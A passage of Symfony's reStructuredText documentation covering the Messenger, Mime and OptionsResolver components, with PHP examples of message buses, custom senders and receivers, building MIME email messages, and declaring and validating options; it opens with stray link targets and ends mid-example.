.. _`locks`: https://en.wikipedia.org/wiki/Lock_(computer_science)
.. _`MongoDB Connection String`: https://docs.mongodb.com/manual/reference/connection-string/
.. _`mongodb/mongodb`: https://packagist.org/packages/mongodb/mongodb
.. _`MongoDBClient::__construct`: https://docs.mongodb.com/php-library/current/reference/method/MongoDBClient__construct/
.. _`PDO`: https://www.php.net/pdo
.. _`PHP semaphore functions`: https://www.php.net/manual/en/book.sem.php
.. _`Replica Set Read and Write Semantics`: https://docs.mongodb.com/manual/applications/replication/
.. _`ZooKeeper`: https://zookeeper.apache.org/
.. _`readers-writer lock`: https://en.wikipedia.org/wiki/Readers%E2%80%93writer_lock
.. _`priority policy`: https://en.wikipedia.org/wiki/Readers%E2%80%93writer_lock#Priority_policies
.. _`PCNTL`: https://www.php.net/manual/book.pcntl.php
The Messenger Component
=======================

    The Messenger component helps applications send and receive messages to/from
    other applications or via message queues.

    The component is greatly inspired by Matthias Noback's series of
    `blog posts about command buses`_ and the `SimpleBus project`_.

.. seealso::

    This article explains how to use the Messenger features as an independent
    component in any PHP application. Read the :doc:`/messenger` article to
    learn about how to use it in Symfony applications.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/messenger

.. include:: /components/require_autoload.rst.inc

Concepts
--------

.. raw:: html

    <object data="../_images/components/messenger/overview.svg" type="image/svg+xml"
        alt="A flow diagram visualizing how each concept relates to eachother. Each concept is described in the subsequent text."
    ></object>

**Sender**:
   Responsible for serializing and sending messages to *something*. This
   something can be a message broker or a third party API for example.

**Receiver**:
   Responsible for retrieving, deserializing and forwarding messages to handler(s).
   This can be a message queue puller or an API endpoint for example.

**Handler**:
   Responsible for handling messages using the business logic applicable to the messages.
   Handlers are called by the ``HandleMessageMiddleware`` middleware.

**Middleware**:
   Middleware can access the message and its wrapper (the envelope) while it is
   dispatched through the bus.
   Literally *"the software in the middle"*, those are not about core concerns
   (business logic) of an application. Instead, they are cross cutting concerns
   applicable throughout the application and affecting the entire message bus.
   For instance: logging, validating a message, starting a transaction, ...
   They are also responsible for calling the next middleware in the chain,
   which means they can tweak the envelope, by adding stamps to it or even
   replacing it, as well as interrupt the middleware chain. Middleware are called
   both when a message is originally dispatched and again later when a message
   is received from a transport.

**Envelope**:
   Messenger specific concept, it gives full flexibility inside the message bus,
   by wrapping the messages into it, allowing to add useful information inside
   through *envelope stamps*.

**Envelope Stamps**:
   Piece of information you need to attach to your message: serializer context
   to use for transport, markers identifying a received message or any sort of
   metadata your middleware or transport layer may use.

Bus
---

The bus is used to dispatch messages. The behavior of the bus is in its ordered
middleware stack. The component comes with a set of middleware that you can use.

When using the message bus with Symfony's FrameworkBundle, the following middleware
are configured for you:

#. :class:`Symfony\\Component\\Messenger\\Middleware\\SendMessageMiddleware` (enables asynchronous processing, logs the processing of your messages if you provide a logger)
#. :class:`Symfony\\Component\\Messenger\\Middleware\\HandleMessageMiddleware` (calls the registered handler(s))

Example::

    use App\Message\MyMessage;
    use App\MessageHandler\MyMessageHandler;
    use Symfony\Component\Messenger\Handler\HandlersLocator;
    use Symfony\Component\Messenger\MessageBus;
    use Symfony\Component\Messenger\Middleware\HandleMessageMiddleware;

    $handler = new MyMessageHandler();

    $bus = new MessageBus([
        new HandleMessageMiddleware(new HandlersLocator([
            MyMessage::class => [$handler],
        ])),
    ]);

    $bus->dispatch(new MyMessage(/* ... */));

.. note::

    Every middleware needs to implement the :class:`Symfony\\Component\\Messenger\\Middleware\\MiddlewareInterface`.

Handlers
--------

Once dispatched to the bus, messages will be handled by a "message handler". A
message handler is a PHP callable (i.e. a function or an instance of a class)
that will do the required processing for your message::

    namespace App\MessageHandler;

    use App\Message\MyMessage;

    class MyMessageHandler
    {
        public function __invoke(MyMessage $message): void
        {
            // Message processing...
        }
    }

.. _messenger-envelopes:

Adding Metadata to Messages (Envelopes)
---------------------------------------

If you need to add metadata or some configuration to a message, wrap it with the
:class:`Symfony\\Component\\Messenger\\Envelope` class and add stamps.
For example, to set the serialization groups used when the message goes
through the transport layer, use the ``SerializerStamp`` stamp::

    use Symfony\Component\Messenger\Envelope;
    use Symfony\Component\Messenger\Stamp\SerializerStamp;

    $bus->dispatch(
        (new Envelope($message))->with(new SerializerStamp([
            // groups are applied to the whole message, so make sure
            // to define the group for every embedded object
            'groups' => ['my_serialization_groups'],
        ]))
    );

Here are some important envelope stamps that are shipped with the Symfony Messenger:

* :class:`Symfony\\Component\\Messenger\\Stamp\\DelayStamp`,
  to delay handling of an asynchronous message.
* :class:`Symfony\\Component\\Messenger\\Stamp\\DispatchAfterCurrentBusStamp`,
  to make the message be handled after the current bus has executed. Read more
  at :ref:`messenger-transactional-messages`.
* :class:`Symfony\\Component\\Messenger\\Stamp\\HandledStamp`,
  a stamp that marks the message as handled by a specific handler.
  Allows accessing the handler returned value and the handler name.
* :class:`Symfony\\Component\\Messenger\\Stamp\\ReceivedStamp`,
  an internal stamp that marks the message as received from a transport.
* :class:`Symfony\\Component\\Messenger\\Stamp\\SentStamp`,
  a stamp that marks the message as sent by a specific sender.
  Allows accessing the sender FQCN and the alias if available from the
  :class:`Symfony\\Component\\Messenger\\Transport\\Sender\\SendersLocator`.
* :class:`Symfony\\Component\\Messenger\\Stamp\\SerializerStamp`,
  to configure the serialization groups used by the transport.
* :class:`Symfony\\Component\\Messenger\\Stamp\\ValidationStamp`,
  to configure the validation groups used when the validation middleware is enabled.
* :class:`Symfony\\Component\\Messenger\\Stamp\\ErrorDetailsStamp`,
  an internal stamp when a message fails due to an exception in the handler.
* :class:`Symfony\\Component\\Messenger\\Stamp\\ScheduledStamp`,
  a stamp that marks the message as produced by a scheduler. This helps
  differentiate it from messages created "manually". You can learn more about it
  in the :doc:`Scheduler documentation </scheduler>`.

.. note::

    The :class:`Symfony\\Component\\Messenger\\Stamp\\ErrorDetailsStamp` stamp
    contains a :class:`Symfony\\Component\\ErrorHandler\\Exception\\FlattenException`,
    which is a representation of the exception that made the message fail. You can
    get this exception with the
    :method:`Symfony\\Component\\Messenger\\Stamp\\ErrorDetailsStamp::getFlattenException`
    method. This exception is normalized thanks to the
    :class:`Symfony\\Component\\Messenger\\Transport\\Serialization\\Normalizer\\FlattenExceptionNormalizer`
    which helps error reporting in the Messenger context.

Instead of dealing directly with the messages in the middleware you receive the envelope.
Hence you can inspect the envelope content and its stamps, or add any::

    use App\Message\Stamp\AnotherStamp;
    use Symfony\Component\Messenger\Envelope;
    use Symfony\Component\Messenger\Middleware\MiddlewareInterface;
    use Symfony\Component\Messenger\Middleware\StackInterface;
    use Symfony\Component\Messenger\Stamp\ReceivedStamp;

    class MyOwnMiddleware implements MiddlewareInterface
    {
        public function handle(Envelope $envelope, StackInterface $stack): Envelope
        {
            if (null !== $envelope->last(ReceivedStamp::class)) {
                // Message just has been received...

                // You could for example add another stamp.
                $envelope = $envelope->with(new AnotherStamp(/* ... */));
            } else {
                // Message was just originally dispatched
            }

            return $stack->next()->handle($envelope, $stack);
        }
    }

The above example will forward the message to the next middleware with an
additional stamp *if* the message has just been received (i.e. has at least one
``ReceivedStamp`` stamp). You can create your own stamps by implementing
:class:`Symfony\\Component\\Messenger\\Stamp\\StampInterface`.

If you want to examine all stamps on an envelope, use the ``$envelope->all()``
method, which returns all stamps grouped by type (FQCN). Alternatively, you can
iterate through all stamps of a specific type by using the FQCN as first
parameter of this method (e.g. ``$envelope->all(ReceivedStamp::class)``).

.. note::

    Any stamp must be serializable using the Symfony Serializer component
    if going through transport using the :class:`Symfony\\Component\\Messenger\\Transport\\Serialization\\Serializer`
    base serializer.

Transports
----------

In order to send and receive messages, you will have to configure a transport. A
transport will be responsible for communicating with your message broker or 3rd parties.

Your own Sender
~~~~~~~~~~~~~~~

Imagine that you already have an ``ImportantAction`` message going through the
message bus and being handled by a handler. Now, you also want to send this
message as an email (using the :doc:`Mime </components/mime>` and
:doc:`Mailer </mailer>` components).

Using the :class:`Symfony\\Component\\Messenger\\Transport\\Sender\\SenderInterface`,
you can create your own message sender::

    namespace App\MessageSender;

    use App\Message\ImportantAction;
    use Symfony\Component\Mailer\MailerInterface;
    use Symfony\Component\Messenger\Envelope;
    use Symfony\Component\Messenger\Transport\Sender\SenderInterface;
    use Symfony\Component\Mime\Email;

    class ImportantActionToEmailSender implements SenderInterface
    {
        public function __construct(
            private MailerInterface $mailer,
            private string $toEmail,
        ) {
        }

        public function send(Envelope $envelope): Envelope
        {
            $message = $envelope->getMessage();

            if (!$message instanceof ImportantAction) {
                throw new \InvalidArgumentException(sprintf('This transport only supports "%s" messages.', ImportantAction::class));
            }

            $this->mailer->send(
                (new Email())
                    ->to($this->toEmail)
                    ->subject('Important action made')
                    ->html('<h1>Important action</h1><p>Made by '.$message->getUsername().'</p>')
            );

            return $envelope;
        }
    }

Your own Receiver
~~~~~~~~~~~~~~~~~

A receiver is responsible for getting messages from a source and dispatching
them to the application.

Imagine you already processed some "orders" in your application using a
``NewOrder`` message. Now you want to integrate with a 3rd party or a legacy
application but you can't use an API and need to use a shared CSV file with new
orders.

You will read this CSV file and dispatch a ``NewOrder`` message. All you need to
do is to write your own CSV receiver::

    namespace App\MessageReceiver;

    use App\Message\NewOrder;
    use Symfony\Component\Messenger\Envelope;
    use Symfony\Component\Messenger\Exception\MessageDecodingFailedException;
    use Symfony\Component\Messenger\Transport\Receiver\ReceiverInterface;
    use Symfony\Component\Serializer\SerializerInterface;

    class NewOrdersFromCsvFileReceiver implements ReceiverInterface
    {
        private $connection;

        public function __construct(
            private SerializerInterface $serializer,
            private string $filePath,
        ) {
            // Available connection bundled with the Messenger component
            // can be found in "Symfony\Component\Messenger\Bridge\*\Transport\Connection".
            $this->connection = /* create your connection */;
        }

        public function get(): iterable
        {
            // Receive the envelope according to your transport ($yourEnvelope here),
            // in most cases, using a connection is the easiest solution.
            $yourEnvelope = $this->connection->get();
            if (null === $yourEnvelope) {
                return [];
            }

            try {
                $envelope = $this->serializer->decode([
                    'body' => $yourEnvelope['body'],
                    'headers' => $yourEnvelope['headers'],
                ]);
            } catch (MessageDecodingFailedException $exception) {
                $this->connection->reject($yourEnvelope['id']);
                throw $exception;
            }

            return [$envelope->with(new CustomStamp($yourEnvelope['id']))];
        }

        public function ack(Envelope $envelope): void
        {
            // Add information about the handled message
        }

        public function reject(Envelope $envelope): void
        {
            // In the case of a custom connection
            $id = /* get the message id thanks to information or stamps present in the envelope */;

            $this->connection->reject($id);
        }
    }

Receiver and Sender on the same Bus
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To allow sending and receiving messages on the same bus and prevent an infinite
loop, the message bus will add a :class:`Symfony\\Component\\Messenger\\Stamp\\ReceivedStamp`
stamp to the message envelopes and the :class:`Symfony\\Component\\Messenger\\Middleware\\SendMessageMiddleware`
middleware will know it should not route these messages again to a transport.

Learn more
----------

.. toctree::
    :maxdepth: 1
    :glob:

    /messenger
    /messenger/*

.. _`blog posts about command buses`: https://matthiasnoback.nl/tags/command%20bus/
.. _`SimpleBus project`: https://docs.simplebus.io/en/latest/
The Mime Component
==================

    The Mime component allows manipulating the MIME messages used to send emails
    and provides utilities related to MIME types.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/mime

.. include:: /components/require_autoload.rst.inc

Introduction
------------

`MIME`_ (Multipurpose Internet Mail Extensions) is an Internet standard that
extends the original basic format of emails to support features like:

* Headers and text contents using non-ASCII characters;
* Message bodies with multiple parts (e.g. HTML and plain text contents);
* Non-text attachments: audio, video, images, PDF, etc.

The entire MIME standard is complex and huge, but Symfony abstracts all that
complexity to provide two ways of creating MIME messages:

* A high-level API based on the :class:`Symfony\\Component\\Mime\\Email` class
  to quickly create email messages with all the common features;
* A low-level API based on the :class:`Symfony\\Component\\Mime\\Message` class
  to have absolute control over every single part of the email message.

Usage
-----

Use the :class:`Symfony\\Component\\Mime\\Email` class and their *chainable*
methods to compose the entire email message::

    use Symfony\Component\Mime\Email;

    $email = (new Email())
        ->from('fabien@symfony.com')
        ->to('foo@example.com')
        ->cc('bar@example.com')
        ->bcc('baz@example.com')
        ->replyTo('fabien@symfony.com')
        ->priority(Email::PRIORITY_HIGH)
        ->subject('Important Notification')
        ->text('Lorem ipsum...')
        ->html('<h1>Lorem ipsum</h1> <p>...</p>')
    ;

The only purpose of this component is to create the email messages. Use the
:doc:`Mailer component </mailer>` to actually send them.

Twig Integration
----------------

The Mime component comes with excellent integration with Twig, allowing you to
create messages from Twig templates, embed images, inline CSS and more. Details
on how to use those features can be found in the Mailer documentation:
:ref:`Twig: HTML & CSS <mailer-twig>`.

But if you're using the Mime component without the Symfony framework, you'll need
to handle a few setup details.

Twig Setup
~~~~~~~~~~

To integrate with Twig, use the :class:`Symfony\\Bridge\\Twig\\Mime\\BodyRenderer`
class to render the template and update the email message contents with the results::

    // ...
    use Symfony\Bridge\Twig\Mime\BodyRenderer;
    use Twig\Environment;
    use Twig\Loader\FilesystemLoader;

    // when using the Mime component inside a full-stack Symfony application, you
    // don't need to do this Twig setup. You only have to inject the 'twig' service
    $loader = new FilesystemLoader(__DIR__.'/templates');
    $twig = new Environment($loader);

    $renderer = new BodyRenderer($twig);
    // this updates the $email object contents with the result of rendering
    // the template defined earlier with the given context
    $renderer->render($email);

Inlining CSS Styles (and other Extensions)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To use the :ref:`inline_css <mailer-inline-css>` filter, first install the Twig
extension:

.. code-block:: terminal

    $ composer require twig/cssinliner-extra

Now, enable the extension::

    // ...
    use Twig\Extra\CssInliner\CssInlinerExtension;

    $loader = new FilesystemLoader(__DIR__.'/templates');
    $twig = new Environment($loader);
    $twig->addExtension(new CssInlinerExtension());

The same process should be used for enabling other extensions, like the
:ref:`MarkdownExtension <mailer-markdown>` and :ref:`InkyExtension <mailer-inky>`.

Creating Raw Email Messages
---------------------------

This is useful for advanced applications that need absolute control over every
email part. It's not recommended for applications with regular email
requirements because it adds complexity for no real gain.

Before continuing, it's important to have a look at the low level structure of
an email message. Consider a message which includes some content as both text
and HTML, a single PNG image embedded in those contents and a PDF file attached
to it. The MIME standard allows structuring this message in different ways, but
the following tree is the one that works on most email clients:

.. code-block:: text

    multipart/mixed
    ├── multipart/related
    │   ├── multipart/alternative
    │   │   ├── text/plain
    │   │   └── text/html
    │   └── image/png
    └── application/pdf

This is the purpose of each MIME message part:

* ``multipart/alternative``: used when two or more parts are alternatives of the
  same (or very similar) content. The preferred format must be added last.
* ``multipart/mixed``: used to send different content types in the same message,
  such as when attaching files.
* ``multipart/related``: used to indicate that each message part is a component
  of an aggregate whole. The most common usage is to display images embedded
  in the message contents.

When using the low-level :class:`Symfony\\Component\\Mime\\Message` class to
create the email message, you must keep all the above in mind to define the
different parts of the email by hand::

    use Symfony\Component\Mime\Header\Headers;
    use Symfony\Component\Mime\Message;
    use Symfony\Component\Mime\Part\Multipart\AlternativePart;
    use Symfony\Component\Mime\Part\TextPart;

    $headers = (new Headers())
        ->addMailboxListHeader('From', ['fabien@symfony.com'])
        ->addMailboxListHeader('To', ['foo@example.com'])
        ->addTextHeader('Subject', 'Important Notification')
    ;

    $textContent = new TextPart('Lorem ipsum...');
    $htmlContent = new TextPart('<h1>Lorem ipsum</h1> <p>...</p>', null, 'html');
    $body = new AlternativePart($textContent, $htmlContent);

    $email = new Message($headers, $body);

Embedding images and attaching files is possible by creating the appropriate
email multiparts::

    // ...
    use Symfony\Component\Mime\Part\DataPart;
    use Symfony\Component\Mime\Part\Multipart\MixedPart;
    use Symfony\Component\Mime\Part\Multipart\RelatedPart;

    // ...
    $embeddedImage = new DataPart(fopen('/path/to/images/logo.png', 'r'), null, 'image/png');
    $imageCid = $embeddedImage->getContentId();

    $attachedFile = new DataPart(fopen('/path/to/documents/terms-of-use.pdf', 'r'), null, 'application/pdf');

    $textContent = new TextPart('Lorem ipsum...');
    $htmlContent = new TextPart(sprintf(
        '<img src="cid:%s"/> <h1>Lorem ipsum</h1> <p>...</p>', $imageCid
    ), null, 'html');
    $bodyContent = new AlternativePart($textContent, $htmlContent);
    $body = new RelatedPart($bodyContent, $embeddedImage);

    $messageParts = new MixedPart($body, $attachedFile);

    $email = new Message($headers, $messageParts);

Serializing Email Messages
--------------------------

Email messages created with either the ``Email`` or ``Message`` classes can be
serialized because they are simple data objects::

    $email = (new Email())
        ->from('fabien@symfony.com')
        // ...
    ;

    $serializedEmail = serialize($email);

A common use case is to store serialized email messages, include them in a
message sent with the :doc:`Messenger component </components/messenger>` and
recreate them later when sending them. Use the
:class:`Symfony\\Component\\Mime\\RawMessage` class to recreate email messages
from their serialized contents::

    use Symfony\Component\Mime\RawMessage;

    // ...
    $serializedEmail = serialize($email);

    // later, recreate the original message to actually send it
    $message = new RawMessage(unserialize($serializedEmail));

MIME Types Utilities
--------------------

Although MIME was designed mainly for creating emails, the content types (also
known as `MIME types`_ and "media types") defined by MIME standards are also of
importance in communication protocols outside of email, such as HTTP. That's
why this component also provides utilities to work with MIME types.

The :class:`Symfony\\Component\\Mime\\MimeTypes` class transforms between
MIME types and file name extensions::

    use Symfony\Component\Mime\MimeTypes;

    $mimeTypes = new MimeTypes();
    $exts = $mimeTypes->getExtensions('application/javascript');
    // $exts = ['js', 'jsm', 'mjs']
    $exts = $mimeTypes->getExtensions('image/jpeg');
    // $exts = ['jpeg', 'jpg', 'jpe']

    $types = $mimeTypes->getMimeTypes('js');
    // $types = ['application/javascript', 'application/x-javascript', 'text/javascript']
    $types = $mimeTypes->getMimeTypes('apk');
    // $types = ['application/vnd.android.package-archive']

These methods return arrays with one or more elements. The element position
indicates its priority, so the first returned extension is the preferred one.

.. _components-mime-type-guess:

Guessing the MIME Type
~~~~~~~~~~~~~~~~~~~~~~

Another useful utility allows to guess the MIME type of any given file::

    use Symfony\Component\Mime\MimeTypes;

    $mimeTypes = new MimeTypes();
    $mimeType = $mimeTypes->guessMimeType('/some/path/to/image.gif');
    // Guessing is not based on the file name, so $mimeType will be 'image/gif'
    // only if the given file is truly a GIF image

Guessing the MIME type is a time-consuming process that requires inspecting
part of the file contents. Symfony applies multiple guessing mechanisms, one
of them based on the PHP `fileinfo extension`_. It's recommended to install
that extension to improve the guessing performance.

Adding a MIME Type Guesser
..........................

You can add your own MIME type guesser by creating a class that implements
:class:`Symfony\\Component\\Mime\\MimeTypeGuesserInterface`::

    namespace App;

    use Symfony\Component\Mime\MimeTypeGuesserInterface;

    class SomeMimeTypeGuesser implements MimeTypeGuesserInterface
    {
        public function isGuesserSupported(): bool
        {
            // return true when the guesser is supported (might depend on the OS for instance)
            return true;
        }

        public function guessMimeType(string $path): ?string
        {
            // inspect the contents of the file stored in $path to guess its
            // type and return a valid MIME type ... or null if unknown

            return '...';
        }
    }

MIME type guessers must be :ref:`registered as services <service-container-creating-service>`
and :doc:`tagged </service_container/tags>` with the ``mime.mime_type_guesser`` tag.
If you're using the
:ref:`default services.yaml configuration <service-container-services-load-example>`,
this is already done for you, thanks to :ref:`autoconfiguration <services-autoconfigure>`.

.. _`MIME`: https://en.wikipedia.org/wiki/MIME
.. _`MIME types`: https://en.wikipedia.org/wiki/Media_type
.. _`fileinfo extension`: https://www.php.net/fileinfo
The OptionsResolver Component
=============================

    The OptionsResolver component is an improved replacement for the
    :phpfunction:`array_replace` PHP function. It allows you to create an
    options system with required options, defaults, validation (type, value),
    normalization and more.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/options-resolver

.. include:: /components/require_autoload.rst.inc

Usage
-----

Imagine you have a ``Mailer`` class which has four options: ``host``,
``username``, ``password`` and ``port``::

    class Mailer
    {
        protected array $options;

        public function __construct(array $options = [])
        {
            $this->options = $options;
        }
    }

When accessing the ``$options``, you need to add some boilerplate code to
check which options are set::

    class Mailer
    {
        // ...
        public function sendMail($from, $to): void
        {
            $mail = ...;

            $mail->setHost($this->options['host'] ?? 'smtp.example.org');
            $mail->setUsername($this->options['username'] ?? 'user');
            $mail->setPassword($this->options['password'] ?? 'pa$$word');
            $mail->setPort($this->options['port'] ?? 25);

            // ...
        }
    }

Also, the default values of the options are buried in the business logic of your
code. Use :phpfunction:`array_replace` to fix that::

    class Mailer
    {
        // ...

        public function __construct(array $options = [])
        {
            $this->options = array_replace([
                'host'     => 'smtp.example.org',
                'username' => 'user',
                'password' => 'pa$$word',
                'port'     => 25,
            ], $options);
        }
    }

Now all four options are guaranteed to be set, but you could still make an error
like the following when using the ``Mailer`` class::

    $mailer = new Mailer([
        'usernme' => 'johndoe',  // 'username' is wrongly spelled as 'usernme'
    ]);

No error will be shown. In the best case, the bug will appear during testing,
but the developer will spend time looking for the problem. In the worst case,
the bug might not appear until it's deployed to the live system.

Fortunately, the :class:`Symfony\\Component\\OptionsResolver\\OptionsResolver`
class helps you to fix this problem::

    use Symfony\Component\OptionsResolver\OptionsResolver;

    class Mailer
    {
        // ...

        public function __construct(array $options = [])
        {
            $resolver = new OptionsResolver();
            $resolver->setDefaults([
                'host'     => 'smtp.example.org',
                'username' => 'user',
                'password' => 'pa$$word',
                'port'     => 25,
            ]);

            $this->options = $resolver->resolve($options);
        }
    }

Like before, all options will be guaranteed to be set. Additionally, an
:class:`Symfony\\Component\\OptionsResolver\\Exception\\UndefinedOptionsException`
is thrown if an unknown option is passed::

    $mailer = new Mailer([
        'usernme' => 'johndoe',
    ]);

    // UndefinedOptionsException: The option "usernme" does not exist.
    // Defined options are: "host", "password", "port", "username"

The rest of your code can access the values of the options without boilerplate
code::

    // ...
    class Mailer
    {
        // ...

        public function sendMail($from, $to): void
        {
            $mail = ...;
            $mail->setHost($this->options['host']);
            $mail->setUsername($this->options['username']);
            $mail->setPassword($this->options['password']);
            $mail->setPort($this->options['port']);
            // ...
        }
    }

It's a good practice to split the option configuration into a separate method::

    // ...
    class Mailer
    {
        // ...

        public function __construct(array $options = [])
        {
            $resolver = new OptionsResolver();
            $this->configureOptions($resolver);

            $this->options = $resolver->resolve($options);
        }

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'host'       => 'smtp.example.org',
                'username'   => 'user',
                'password'   => 'pa$$word',
                'port'       => 25,
                'encryption' => null,
            ]);
        }
    }

First, your code becomes easier to read, especially if the constructor does more
than processing options. Second, sub-classes may now override the
``configureOptions()`` method to adjust the configuration of the options::

    // ...
    class GoogleMailer extends Mailer
    {
        public function configureOptions(OptionsResolver $resolver): void
        {
            parent::configureOptions($resolver);

            $resolver->setDefaults([
                'host' => 'smtp.google.com',
                'encryption' => 'ssl',
            ]);
        }
    }

Required Options
~~~~~~~~~~~~~~~~

If an option must be set by the caller, pass that option to
:method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::setRequired`.
For example, to make the ``host`` option required, you can do::

    // ...
    class Mailer
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...
            $resolver->setRequired('host');
        }
    }

If you omit a required option, a
:class:`Symfony\\Component\\OptionsResolver\\Exception\\MissingOptionsException`
will be thrown::

    $mailer = new Mailer();

    // MissingOptionsException: The required option "host" is missing.

The :method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::setRequired`
method accepts a single name or an array of option names if you have more than
one required option::

    // ...
    class Mailer
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...
            $resolver->setRequired(['host', 'username', 'password']);
        }
    }

Use :method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::isRequired` to find
out if an option is required. You can use
:method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::getRequiredOptions` to
retrieve the names of all required options::

    // ...
    class GoogleMailer extends Mailer
    {
        public function configureOptions(OptionsResolver $resolver): void
        {
            parent::configureOptions($resolver);

            if ($resolver->isRequired('host')) {
                // ...
            }

            $requiredOptions = $resolver->getRequiredOptions();
        }
    }

If you want to check whether a required option is still missing from the default
options, you can use :method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::isMissing`.
The difference between this and :method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::isRequired`
is that this method will return false if a required option has already
been set::

    // ...
    class Mailer
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...
            $resolver->setRequired('host');
        }
    }

    // ...
    class GoogleMailer extends Mailer
    {
        public function configureOptions(OptionsResolver $resolver): void
        {
            parent::configureOptions($resolver);

            $resolver->isRequired('host');
            // => true

            $resolver->isMissing('host');
            // => true

            $resolver->setDefault('host', 'smtp.google.com');

            $resolver->isRequired('host');
            // => true

            $resolver->isMissing('host');
            // => false
        }
    }

The :method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::getMissingOptions` method
lets you access the names of all missing options.

Type Validation
~~~~~~~~~~~~~~~

You can run additional checks on the options to make sure they were passed
correctly. To validate the types of the options, call
:method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::setAllowedTypes`::

    // ...
    class Mailer
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...

            // specify one allowed type
            $resolver->setAllowedTypes('host', 'string');

            // specify multiple allowed types
            $resolver->setAllowedTypes('port', ['null', 'int']);

            // check all items in an array recursively for a type
            $resolver->setAllowedTypes('dates', 'DateTime[]');
            $resolver->setAllowedTypes('ports', 'int[]');
        }
    }

You can pass any type for which an ``is_<type>()`` function is defined in PHP.
You may also pass fully qualified class or interface names (which is checked
using ``instanceof``). Additionally, you can validate all items in an array
recursively by suffixing the type with ``[]``.

If you pass an invalid option now, an
:class:`Symfony\\Component\\OptionsResolver\\Exception\\InvalidOptionsException`
is thrown::

    $mailer = new Mailer([
        'host' => 25,
    ]);

    // InvalidOptionsException: The option "host" with value "25" is
    // expected to be of type "string", but is of type "int"

In sub-classes, you can use :method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::addAllowedTypes`
to add additional allowed types without erasing the ones already set.

.. _optionsresolver-validate-value:

Value Validation
~~~~~~~~~~~~~~~~

Some options can only take one of a fixed list of predefined values. For
example, suppose the ``Mailer`` class has a ``transport`` option which can be
one of ``sendmail``, ``mail`` and ``smtp``. Use the method
:method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::setAllowedValues`
to verify that the passed option contains one of these values::

    // ...
    class Mailer
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...
            $resolver->setDefault('transport', 'sendmail');
            $resolver->setAllowedValues('transport', ['sendmail', 'mail', 'smtp']);
        }
    }

If you pass an invalid transport, an
:class:`Symfony\\Component\\OptionsResolver\\Exception\\InvalidOptionsException`
is thrown::

    $mailer = new Mailer([
        'transport' => 'send-mail',
    ]);

    // InvalidOptionsException: The option "transport" with value "send-mail"
    // is invalid. Accepted values are: "sendmail", "mail", "smtp"

For options with more complicated validation schemes, pass a closure which
returns ``true`` for acceptable values and ``false`` for invalid values::

    // ...
    $resolver->setAllowedValues('transport', function (string $value): bool {
        // return true or false
    });

.. tip::

    You can even use the :doc:`Validator </validation>` component to validate the
    input by using the :method:`Symfony\\Component\\Validator\\Validation::createIsValidCallable`
    method::

        use Symfony\Component\OptionsResolver\OptionsResolver;
        use Symfony\Component\Validator\Constraints\Length;
        use Symfony\Component\Validator\Validation;

        // ...
        $resolver->setAllowedValues('transport', Validation::createIsValidCallable(
            new Length(['min' => 10 ])
        ));

In sub-classes, you can use :method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::addAllowedValues`
to add additional allowed values without erasing the ones already set.

Option Normalization
~~~~~~~~~~~~~~~~~~~~

Sometimes, option values need to be normalized before you can use them. For
instance, assume that the ``host`` should always start with ``http://``. To do
that, you can write normalizers. Normalizers are executed after validating an
option. You can configure a normalizer by calling
:method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::setNormalizer`::

    use Symfony\Component\OptionsResolver\Options;

    // ...
    class Mailer
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...

            $resolver->setNormalizer('host', function (Options $options, string $value): string {
                if (!str_starts_with($value, 'http://')) {
                    $value = 'http://'.$value;
                }

                return $value;
            });
        }
    }

The normalizer receives the actual ``$value`` and returns the normalized form.
You see that the closure also takes an ``$options`` parameter. This is useful
if you need to use other options during normalization::

    // ...
    class Mailer
    {
        // ...
        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...
            $resolver->setNormalizer('host', function (Options $options, string $value): string {
                if (!str_starts_with($value, 'http://') && !str_starts_with($value, 'https://')) {
                    if ('ssl' === $options['encryption']) {
                        $value = 'https://'.$value;
                    } else {
                        $value = 'http://'.$value;
                    }
                }

                return $value;
            });
        }
    }

To normalize a new allowed value in subclasses that are being normalized
in parent classes, use :method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::addNormalizer` method.
This way, the ``$value`` argument will receive the previously normalized
value, otherwise you can prepend the new normalizer by passing ``true`` as
third argument.

Default Values that Depend on another Option
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Suppose you want to set the default value of the ``port`` option based on the
encryption chosen by the user of the ``Mailer`` class. More precisely, you want
to set the port to ``465`` if SSL is used and to ``25`` otherwise.

You can implement this feature by passing a closure as the default value of
the ``port`` option. The closure receives the options as arguments. Based on
these options, you can return the desired default value::

    use Symfony\Component\OptionsResolver\Options;

    // ...
    class Mailer
    {
        // ...
        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...
            $resolver->setDefault('encryption', null);

            $resolver->setDefault('port', function (Options $options): int {
                if ('ssl' === $options['encryption']) {
                    return 465;
                }

                return 25;
            });
        }
    }

.. caution::

    The argument of the callable must be type hinted as ``Options``. Otherwise,
    the callable itself is considered as the default value of the option.

.. note::

    The closure is only executed if the ``port`` option isn't set by the user
    or overwritten in a subclass.

A previously set default value can be accessed by adding a second argument to
the closure::

    // ...
    class Mailer
    {
        // ...
        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...
            $resolver->setDefaults([
                'encryption' => null,
                'host' => 'example.org',
